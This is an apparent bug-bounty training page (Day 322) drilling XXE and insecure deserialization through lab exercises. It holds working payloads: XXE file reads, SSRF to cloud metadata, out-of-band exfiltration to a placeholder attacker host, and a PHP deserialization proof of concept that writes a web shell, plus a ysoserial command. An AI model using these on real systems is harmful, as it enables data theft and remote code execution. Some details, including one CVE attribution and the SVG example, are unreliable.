---
title: "Weak Area Reinforcement Day 7 — XXE and Advanced Deserialization"
tags: [reinforcement, XXE, deserialization, Java, PHP, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 322
related_topics:
  - Weak Area Reinforcement Day 6 (Day 321)
  - Server-Side Attack Review (Day 185)
  - Web Exploitation (R-02)
---

# Day 322 — Weak Area Reinforcement Day 7: XXE and Advanced Deserialization

---

## Goals

Drill XXE beyond file read to include parameter entity attacks and SSRF via XXE.
Introduce insecure deserialization — a frequently high-impact, underexplored class.

**Time budget:** 3 hours.

---

## Part 1 — XXE Depth Drill

### Recon: XXE Variants

```
Classic XXE — file read:
  <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>

XXE via SVG upload:
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>
      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
      &xxe;
    </text>
  </svg>

XXE via XLSX:
  Unzip .xlsx → edit xl/worksheets/sheet1.xml → inject entity → re-zip

XXE via docx:
  Same approach — inject into XML files within the ZIP

XXE → SSRF:
  <!DOCTYPE x [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
  <root>&ssrf;</root>
  → Server fetches the URL and returns content in the XML response

Blind XXE (out-of-band):
  <!DOCTYPE x [
    <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;
  ]>

  evil.dtd:
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM
      'http://ATTACKER/x?d=%file;'>">
    %eval; %exfil;

XXE via parameter entities (when external entities blocked):
  <!DOCTYPE x [
    <!ENTITY % foo "bar">
    <!ENTITY % xxe SYSTEM "http://ATTACKER/"> %xxe;
  ]>
```

### Exploit Labs

```
Lab 1: PortSwigger "Exploiting XXE via image file upload"
  Technique: SVG XXE
  File read: ___
  Lab completed: Y/N

Lab 2: PortSwigger "Exploiting blind XXE to exfiltrate data using a malicious external DTD"
  evil.dtd hosted at: ___
  Data exfiltrated: ___
  Lab completed: Y/N

Lab 3: PortSwigger "Exploiting XXE to perform SSRF attacks"
  Target URL: http://169.254.169.254/latest/meta-data/iam/...
  Data returned: ___
  Lab completed: Y/N
```

---

## Part 2 — Insecure Deserialization Introduction

### Recon: Why Deserialization Is Dangerous

```
Serialization: converting an object (in memory) to a byte stream for
               storage or transmission.
Deserialization: reconstructing the object from that byte stream.

Danger: if the application deserializes data controlled by the attacker,
        the deserialization process itself can execute code — because
        the class constructors, destructors, and magic methods run automatically
        as the object is reconstructed.

Languages affected:
  PHP  — unserialize(), uses __wakeup(), __destruct(), __toString()
  Java — ObjectInputStream.readObject(), gadget chains (ysoserial)
  Python — pickle.loads(), uses __reduce__()
  Ruby — Marshal.load()

Identification:
  PHP:  base64 → decode → starts with "O:" or "a:" (PHP serialize format)
        Cookie: O:8:"UserPref":1:{s:5:"theme";s:4:"dark";}
  Java: base64 → decode → starts with "rO0" (0xACED hex — Java magic bytes)
        or HTTP body is binary with Content-Type: application/x-java-serialized-object
  Python pickle: starts with bytes \x80\x04 or \x80\x05
```

### PHP Deserialization PoC

```php
<?php
// Vulnerable code:
$obj = unserialize($_COOKIE['data']);
// If $obj has a class with __destruct() that does file operations:

// Attack: craft a serialized object that triggers __destruct()
// Example: a Logger class whose __destruct() writes a file
class Logger {
    public $logFile;
    public $content;
    public function __destruct() {
        file_put_contents($this->logFile, $this->content);
    }
}

$payload = new Logger();
$payload->logFile = '/var/www/html/shell.php';
$payload->content = '<?php system($_GET["cmd"]); ?>';
echo base64_encode(serialize($payload));
// Send as Cookie: data=BASE64_OUTPUT
?>
```

### Java Deserialization — ysoserial

```bash
# ysoserial generates serialized gadget chain payloads
java -jar ysoserial.jar CommonsCollections6 "id" | base64

# Deliver via:
# - HTTP body (if app deserializes request body)
# - Cookie
# - JWT claim if JWT claims are deserialized

# Detection: base64 blob starting with "rO0"
# Decode: echo "rO0AB..." | base64 -d | xxd | head
# Output starts with: ac ed 00 05  (Java serialization magic bytes)
```

```
Deserialization identified in: ___
Language: PHP / Java / Python
Payload delivered via: ___
RCE achieved: Y/N
Command output: ___
```

---

## Part 3 — Deserialization in Bug Bounty Context

```
How to find deserialization bugs in real programmes:
  1. Check all cookies for base64 blobs with O: or rO0 prefix
  2. Check serialized objects in hidden fields or API JSON values
  3. Look for Java web apps with old Apache Commons, Spring, Struts in headers
  4. Look for ViewState in ASP.NET apps (use YSONET for .NET)
  5. Look for Python pickle in ML/data science APIs (pickle.loads on model input)

Real CVEs:
  CVE-2015-4852 — Oracle WebLogic Java deserialization RCE
  CVE-2017-7525 — Jackson JSON deserialization
  CVE-2019-0232  — Apache Struts2 RCE via deserialization

Severity: always Critical (9.0+) if RCE is achievable.
```

---

## Post-Drill Rating

```
Area                            | Before | After
--------------------------------|--------|-------
XXE — file read                 |   /5   |  /5
XXE — SSRF via XXE              |   /5   |  /5
XXE — OOB exfiltration          |   /5   |  /5
XXE — SVG/XLSX/DOCX vectors     |   /5   |  /5
Deserialization — identification|   /5   |  /5
Deserialization — PHP exploit   |   /5   |  /5
Deserialization — Java ysoserial|   /5   |  /5
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q322.1, Q322.2 …).

---

## Navigation

← Previous: [Day 321 — Weak Area Reinforcement Day 6](DAY-0321-Weak-Area-Reinforcement-Day-06.md)
→ Next: [Day 323 — Weak Area Reinforcement Day 8](DAY-0323-Weak-Area-Reinforcement-Day-08.md)
